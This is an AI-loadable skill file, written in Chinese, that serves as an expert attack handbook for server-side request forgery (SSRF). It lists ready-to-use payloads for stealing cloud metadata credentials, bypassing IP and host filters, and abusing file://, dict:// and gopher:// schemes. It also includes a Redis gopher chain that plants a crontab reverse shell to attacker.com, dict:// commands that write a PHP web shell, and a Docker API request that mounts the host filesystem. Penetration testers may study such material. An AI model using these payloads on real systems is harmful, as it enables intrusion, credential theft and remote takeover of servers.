---
name: ssrf-server-side-request-forgery
description: >-
  SSRF 实战手册。当服务器会拉取 URL、解析主机名、导入远程内容，或可被驱向内网、云元数据、二级协议时使用。
---

# 技能：服务端请求伪造（SSRF）——专家级攻击手册

> **AI 加载说明**：专家级 SSRF 技术。涵盖 URL 过滤器绕过、云元数据端点、协议利用、盲 SSRF 检测，以及链式利用到 RCE。基础模型都知道 169.254.169.254 这类基础内容——本文件讲的是它们会遗漏的部分。如需真实 CVE 利用链、DNS Rebinding 深入剖析、K8s SSRF，以及 SSRF → Redis → RCE 的完整利用，请加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

## 0. 快速开始

### 扩展场景

当你需要以下内容时，也请加载 [SCENARIOS.md](./SCENARIOS.md)：
- WebLogic SSRF（CVE-2014-4210）——`uddiexplorer/SearchPublicRegistries.jsp` + `operator` 参数 + `%0D%0A` CRLF 注入 Redis 命令
- SSRF → 内网 Redis → 写 crontab 反弹 shell 的完整 payload 链
- DNS Rebinding 深入剖析——TTL=0 技巧、首次解析合法→第二次解析指向内网、`rbndr.us` 服务
- Kubernetes SSRF（CVE-2020-8555）及其经 DNS rebinding 的绕过（CVE-2020-8562）
- 通过 PDF/截图生成器实现 SSRF——HTML 转 PDF 中的 `<iframe>` 和 `<img>`
- Gopher 协议完整 TCP 注入——经 Gopherus 构造 Redis、MySQL、FastCGI payload
- URL 解析器混淆实现过滤器绕过——`#@`、`\@`、`%00@`、IPv6 映射 IPv4

### 进阶参考

当你需要以下内容时，也请加载 [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md)：
- URL 解析器差异对照表：Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url
- 完整的云元数据端点清单（AWS IMDSv1/v2、GCP、Azure、DigitalOcean、阿里云、Oracle Cloud、Kubernetes、Hetzner、OpenStack）
- 面向 Redis、MySQL、SMTP、FastCGI、Memcached 的 gopher:// payload 配方（含编码规则）
- DNS Rebinding 详细攻击流程，含 TTL 操纵与 TOCTOU 分析
- PDF/wkhtmltopdf/WeasyPrint/Chrome headless/PhantomJS 的 SSRF 模式与数据外带技巧

### 首轮 payload

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### 主机校验绕过家族

| 校验类型 | 尝试 |
|---|---|
| 拦截 `localhost` 字符串 | `127.0.0.1`, `127.1`, `[::1]` |
| 仅拦截直接 IP | 内网 DNS 名、十进制/八进制/十六进制 IP 形式 |
| 按前缀做白名单 | 用户名部分、子域混淆、重定向链 |
| 跟随重定向 | 由良性外部 URL 重定向到内网目标 |
| 只解析一次却请求两次 | 混合编码或 DNS rebinding 风格目标 |

### 协议路由

| 目标 | 协议 / 目标 |
|---|---|
| 云凭证 | 元数据 HTTP 端点 |
| 内网 HTTP 管理面 | `http://127.0.0.1:port/` |
| Redis / 原始 TCP 类滥用 | `gopher://` |
| 本地文件读取候选 | `file://` |
| 字典 / banner 探测 | `dict://` |

---

## 1. 寻找 SSRF 攻击面

寻找**任何包含 DNS 名、IP 地址或 URL 的参数**：

```
loc=           url=        path=         endpoint=
imageUrl=      dest=       redirect=     uri=
callback=      load=       file=         resource=
link=          src=        data=         ref=
```

**不太明显的 SSRF 入口**：
- PDF/截图生成（对 URL 截图）
- Webhook 配置字段
- 通过 URL 导入/导出（CSV 导入、RSS/Atom 订阅）
- OAuth 重定向 URI（有时会触发服务端请求）
- 代理链中的 `X-Forwarded-Host` / `X-Real-IP` 请求头
- 带外部实体的 XML `DOCTYPE`（`file://`、`http://`）
- GraphQL `@link` 指令（federation）
- Content-Type 为 `text/html`、且会被解析 `<link>` 预加载头的页面

---

## 2. 基础确认方法

```
Step 1: Supply your Burp Collaborator / interact.sh URL
        → Check server initiates outbound connection (full SSRF confirmed)

Step 2: If no callback → test time-based (open port = fast, closed = slow/reset):
        Compare response time for:
        http://192.168.1.1:22   (likely open → fast)
        http://192.168.1.1:9999 (likely closed → slow/timeout)

Step 3: Try accessing localhost services:
        http://127.0.0.1:8080
        http://127.0.0.1:22
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:5984  (CouchDB)
        http://127.0.0.1:2375  (Docker daemon — critical!)
        http://127.0.0.1:4840  (internal admin)
```

---

## 3. 云元数据端点——必试项

### AWS EC2 IMDSv1（无需认证——关键）
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### AWS IMDSv2（需要 token——但要检查 SSRF 能否 GET 到 token）
```
Step 1: PUT http://169.254.169.254/latest/api/token
        Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
Step 2: GET http://169.254.169.254/latest/meta-data/
        Header: X-aws-ec2-metadata-token: TOKEN
```
**如果 SSRF 支持自定义请求头 → 则可完整绕过 IMDSv2**。

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Headers: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Headers: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

### 阿里云
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Kubernetes Service Account
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. IP 地址过滤器绕过技巧

当 `169.254.169.254`、`127.0.0.1`、`localhost` 被拦截时：

### Localhost 变体
```
127.0.0.1
127.1
127.0.1
127.000.000.001    ← octal padding
0x7f000001         ← hex
2130706433         ← decimal (0x7f000001)
0177.0000.0000.0001  ← octal
[::]               ← IPv6 loopback
[::1]              ← IPv6 loopback
[::ffff:127.0.0.1] ← IPv4-mapped IPv6
```

### 169.254.169.254 变体
```
169.254.169.254
2852039166               ← decimal
0xa9fea9fe               ← hex
0251.0376.0251.0376      ← octal
[::ffff:169.254.169.254] ← IPv6
169.254.169.254.nip.io   ← DNS rebinding service
```

### 内网网段
```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
fc00::/7  ← IPv6 private
```

### 通过 DNS 输入绕过过滤器
如果过滤器检查的是 DNS 解析后的 IP（而不是主机名）：
```
http://attacker.com/  ← DNS A record points to 169.254.169.254
```
使用 DNS rebinding：首次解析返回合法 IP → 通过过滤器 → 第二次请求返回内网 IP。

---

## 5. URL Scheme 攻击

当 `http://` 被允许或过滤较弱时：

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp   ← reveals internal network ARP table
file:///proc/net/tcp   ← open network connections

dict://127.0.0.1:6379/INFO   ← Redis INFO command via dict://

gopher://127.0.0.1:6379/_INFO%0d%0a   ← Redis via gopher
gopher://127.0.0.1:9200/   ← Elasticsearch

sftp://attacker.com:11111/   ← triggers SFTP connection (credential hash)
ldap://attacker.com:389/     ← triggers LDAP bind
ftp://attacker.com/          ← triggers FTP connection
```

### Redis Gopher SSRF（具备完整 RCE 潜力）
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 6. 盲 SSRF 检测

当响应不回显抓取内容时：

1. **Burp Collaborator / interact.sh**：检查服务器是否发起 DNS + HTTP 请求
2. **Pingback/webhook 滥用**：把应用自身的 webhook 配置为你的 URL
3. **时间分析**：内网开放端口与关闭端口的响应时间差异
4. **错误分析**：“host not found”“connection refused”“timeout” 等不同错误信息会泄露内网拓扑

---

## 7. 内网服务利用

### Docker API（2375 未认证）
```
http://127.0.0.1:2375/v1.24/containers/json      ← list containers
http://127.0.0.1:2375/v1.24/images/json          ← list images
# Create privileged container → escape to host:
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch（9200 默认无认证）
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis（6379——常见无认证）
```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

### 内网管理后台
```
http://127.0.0.1:8080/admin
http://127.0.0.1:8443/admin
http://127.0.0.1:9000/actuator   ← Spring Boot actuator (exposed endpoints)
http://127.0.0.1:9000/actuator/shutdown
http://127.0.0.1:9000/actuator/env
```

---

## 8. SSRF + 过滤器绕过决策树

```
SSRF parameter found?
├── Try http://169.254.169.254/ directly → blocked?
│   ├── Try decimal/hex/octal variants
│   ├── Try IPv6 variants [::ffff:169.254.169.254]
│   ├── Try DNS rebinding (nip.io, custom NS)
│   └── Try redirect: attacker.com → 169.254.169.254 (302)
│
├── Try http://127.0.0.1/ → blocked?
│   ├── Try 127.1 / 127.0.1 / 0x7f000001 / 2130706433
│   ├── Try localhost → might not be blocked
│   └── Try IPv6 [::1]
│
├── What protocols are allowed?
│   ├── dict:// → test Redis, Memcached
│   ├── gopher:// → full TCP data injection (target Redis/SMTP)
│   ├── file:// → local file read
│   └── sftp:// ldap:// ftp:// → network interactions
│
└── Blind SSRF → use Burp Collaborator
    └── DNS-only → use DNS rebinding or SSRF with OOB DNS
```

---

## 9. SSRF 过滤器思维

来自 zseano 的方法论：**如果开发者只直接过滤 `169.254.169.254`，却没有过滤 `http://169.254.169.254/latest/meta-data`**（完整路径），或者忽略了：
- IPv6 等价形式
- 解析到内网 IP 的 DNS 名
- 重定向链（服务器跟随 302 到内网 IP）

**经典缺口**：应用过滤了 `127.0.0.1`，却没有过滤 `127.1`、`[::1]` 或 `localhost`。

**通过 XML 的应用层 SSRF**（当应用解析 XML 时）：
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```
